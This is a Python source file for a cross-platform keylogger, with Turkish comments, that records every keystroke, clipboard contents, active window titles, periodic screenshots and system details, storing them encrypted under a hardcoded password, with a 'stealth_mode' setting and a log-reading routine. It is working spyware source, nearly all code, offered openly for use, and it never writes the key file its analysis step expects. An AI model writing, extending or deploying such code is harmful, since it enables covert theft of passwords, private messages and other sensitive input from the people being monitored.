import os
import time
import threading
import platform
import json
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

# Platform detection
SYSTEM = platform.system().lower()

try:
    if SYSTEM == "windows":
        import pynput.keyboard
        import pyperclip
        import win32gui
        import win32process
        import psutil
    elif SYSTEM == "linux":
        import subprocess
        from pynput import keyboard
    elif SYSTEM == "darwin":
        from pynput import keyboard
        import subprocess
except ImportError as e:
    print(f"Missing dependencies for {SYSTEM}: {e}")

class AdvancedKeylogger:
    def __init__(self):
        self.config = self.load_config()
        self.log_data = []
        self.is_running = True
        self.encryption_key = self.generate_encryption_key()
        
        # Dosya yolları
        self.log_file = self.config.get("log_file", "system_logs.dat")
        self.screenshot_folder = self.config.get("screenshot_folder", "screens")
        self.encryption_key_file = self.config.get("encryption_key_file", "key.dat")
        
        # Klasörleri oluştur
        os.makedirs(self.screenshot_folder, exist_ok=True)
        
    def load_config(self):
        """Yapılandırma dosyasını yükle"""
        default_config = {
            "log_file": "system_logs.dat",
            "screenshot_folder": "screens",
            "encryption_key_file": "key.dat",
            "screenshot_interval": 60,
            "log_upload_interval": 300,
            "max_log_size": 10000,
            "stealth_mode": True
        }
        
        try:
            with open("config.json", "r") as f:
                user_config = json.load(f)
                default_config.update(user_config)
        except FileNotFoundError:
            with open("config.json", "w") as f:
                json.dump(default_config, f, indent=4)
                
        return default_config

    def generate_encryption_key(self):
        """Güvenli şifreleme anahtarı oluştur"""
        password = b"secure_master_password"
        salt = b"fixed_salt_for_demo"
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        return Fernet(key)

    def encrypt_data(self, data):
        """Veriyi şifrele"""
        if isinstance(data, str):
            data = data.encode()
        return self.encryption_key.encrypt(data)

    def decrypt_data(self, encrypted_data):
        """Verinin şifresini çöz"""
        return self.encryption_key.decrypt(encrypted_data)

    def get_active_window(self):
        """Platforma göre aktif pencereyi al"""
        try:
            if SYSTEM == "windows":
                window = win32gui.GetForegroundWindow()
                title = win32gui.GetWindowText(window)
                _, pid = win32process.GetWindowThreadProcessId(window)
                try:
                    process = psutil.Process(pid)
                    app_name = process.name()
                except:
                    app_name = "Unknown"
                return f"{title} - {app_name}"
            
            elif SYSTEM == "linux":
                try:
                    result = subprocess.run(
                        ["xdotool", "getwindowfocus", "getwindowname"], 
                        capture_output=True, text=True
                    )
                    return result.stdout.strip()
                except:
                    return "Unknown"
                    
            elif SYSTEM == "darwin":
                try:
                    result = subprocess.run(
                        ["osascript", "-e", 'tell app "System Events" to get name of first process whose frontmost is true'],
                        capture_output=True, text=True
                    )
                    return result.stdout.strip()
                except:
                    return "Unknown"
                    
        except Exception as e:
            return f"Error: {e}"

    def log_event(self, event_type, data):
        """Olayı logla"""
        timestamp = datetime.now().isoformat()
        log_entry = {
            "timestamp": timestamp,
            "type": event_type,
            "data": data,
            "system": SYSTEM,
            "window": self.get_active_window()
        }
        
        self.log_data.append(log_entry)
        
        # Bellek optimizasyonu
        if len(self.log_data) > self.config["max_log_size"]:
            self.flush_logs()
            
        # Dosyaya yazma (aralıklı)
        if len(self.log_data) % 50 == 0:
            self.flush_logs()

    def flush_logs(self):
        """Logları dosyaya yaz"""
        try:
            if self.log_data:
                encrypted_logs = self.encrypt_data(json.dumps(self.log_data))
                with open(self.log_file, "ab") as f:
                    f.write(encrypted_logs + b"\n")
                self.log_data = []
        except Exception as e:
            print(f"Log flush error: {e}")

    def on_key_press(self, key):
        """Tuş basma olayı"""
        try:
            key_str = str(key).replace("'", "")
            
            # Özel tuşlar
            if hasattr(key, 'name'):
                key_str = f"[{key.name.upper()}]"
                
            self.log_event("keypress", key_str)
            
        except Exception as e:
            self.log_event("error", f"Keypress error: {e}")

    def start_keylogger(self):
        """Klavye dinleyiciyi başlat"""
        try:
            if SYSTEM == "windows":
                with pynput.keyboard.Listener(on_press=self.on_key_press) as listener:
                    while self.is_running:
                        time.sleep(0.1)
            else:
                with keyboard.Listener(on_press=self.on_key_press) as listener:
                    while self.is_running:
                        time.sleep(0.1)
        except Exception as e:
            self.log_event("error", f"Keylogger start error: {e}")

    def monitor_clipboard(self):
        """Pano değişikliklerini izle"""
        if SYSTEM != "windows":
            return
            
        recent_value = ""
        while self.is_running:
            try:
                import pyperclip
                clipboard_content = pyperclip.paste()
                if clipboard_content and clipboard_content != recent_value:
                    recent_value = clipboard_content
                    if len(clipboard_content) < 1000:  # Büyük verileri loglama
                        self.log_event("clipboard", clipboard_content)
            except Exception as e:
                self.log_event("error", f"Clipboard error: {e}")
            time.sleep(2)

    def monitor_active_window(self):
        """Aktif pencere değişikliklerini izle"""
        last_window = ""
        while self.is_running:
            try:
                current_window = self.get_active_window()
                if current_window != last_window:
                    last_window = current_window
                    self.log_event("window_change", current_window)
            except Exception as e:
                self.log_event("error", f"Window monitor error: {e}")
            time.sleep(1)

    def take_screenshot(self):
        """Ekran görüntüsü al"""
        try:
            if SYSTEM == "windows":
                from PIL import ImageGrab
                screenshot = ImageGrab.grab()
                filename = f"{self.screenshot_folder}/screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                screenshot.save(filename)
                self.log_event("screenshot", filename)
        except Exception as e:
            self.log_event("error", f"Screenshot error: {e}")

    def screenshot_worker(self):
        """Periyodik ekran görüntüsü"""
        while self.is_running:
            self.take_screenshot()
            time.sleep(self.config["screenshot_interval"])

    def system_info_collector(self):
        """Sistem bilgilerini topla"""
        while self.is_running:
            try:
                info = {
                    "platform": platform.platform(),
                    "processor": platform.processor(),
                    "memory": psutil.virtual_memory()._asdict() if SYSTEM == "windows" else {},
                    "disk_usage": psutil.disk_usage('/')._asdict() if SYSTEM == "windows" else {},
                    "running_processes": len(psutil.pids()) if SYSTEM == "windows" else 0
                }
                self.log_event("system_info", info)
            except Exception as e:
                self.log_event("error", f"System info error: {e}")
            time.sleep(60)

    def cleanup(self):
        """Temizlik işlemleri"""
        self.is_running = False
        self.flush_logs()
        
        # Log dosyasını sıkıştır
        try:
            import zipfile
            with zipfile.ZipFile(f"{self.log_file}.zip", 'w') as zipf:
                zipf.write(self.log_file)
            os.remove(self.log_file)
        except:
            pass

    def start(self):
        """Tüm izleme işlemlerini başlat"""
        print("🔍 Advanced System Monitor Started...")
        
        threads = []
        
        # Klavye izleme
        key_thread = threading.Thread(target=self.start_keylogger, daemon=True)
        threads.append(key_thread)
        key_thread.start()
        
        # Pano izleme (sadece Windows)
        if SYSTEM == "windows":
            clip_thread = threading.Thread(target=self.monitor_clipboard, daemon=True)
            threads.append(clip_thread)
            clip_thread.start()
        
        # Pencere izleme
        window_thread = threading.Thread(target=self.monitor_active_window, daemon=True)
        threads.append(window_thread)
        window_thread.start()
        
        # Ekran görüntüsü (sadece Windows)
        if SYSTEM == "windows":
            screen_thread = threading.Thread(target=self.screenshot_worker, daemon=True)
            threads.append(screen_thread)
            screen_thread.start()
        
        # Sistem bilgisi
        if SYSTEM == "windows":
            sys_thread = threading.Thread(target=self.system_info_collector, daemon=True)
            threads.append(sys_thread)
            sys_thread.start()
        
        # Ana döngü
        try:
            while True:
                self.flush_logs()
                time.sleep(30)
        except KeyboardInterrupt:
            print("\n🛑 Stopping monitor...")
        finally:
            self.cleanup()

def analyze_logs(log_file, key_file):
    """Logları analiz et ve raporla"""
    try:
        with open(key_file, "rb") as f:
            key = f.read()
        fernet = Fernet(key)
        
        with open(log_file, "rb") as f:
            encrypted_logs = f.readlines()
        
        all_logs = []
        for encrypted_log in encrypted_logs:
            try:
                decrypted = fernet.decrypt(encrypted_log.strip())
                logs = json.loads(decrypted)
                all_logs.extend(logs)
            except:
                continue
        
        # Analiz
        keypress_count = len([l for l in all_logs if l.get('type') == 'keypress'])
        window_changes = len([l for l in all_logs if l.get('type') == 'window_change'])
        clipboard_changes = len([l for l in all_logs if l.get('type') == 'clipboard'])
        
        print("\n📊 Log Analysis Report:")
        print(f"Total Events: {len(all_logs)}")
        print(f"Keypresses: {keypress_count}")
        print(f"Window Changes: {window_changes}")
        print(f"Clipboard Changes: {clipboard_changes}")
        
        # Son 10 etkinlik
        print("\n🔍 Recent Activities:")
        for log in all_logs[-10:]:
            print(f"{log['timestamp']} - {log['type']}: {log['data'][:50]}...")
            
        return all_logs
        
    except Exception as e:
        print(f"Analysis error: {e}")
        return []

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == "analyze":
        analyze_logs("system_logs.dat", "key.dat")
    else:
        monitor = AdvancedKeylogger()
        
        try:
            monitor.start()
        except Exception as e:
            print(f"Fatal error: {e}")
            monitor.cleanup()
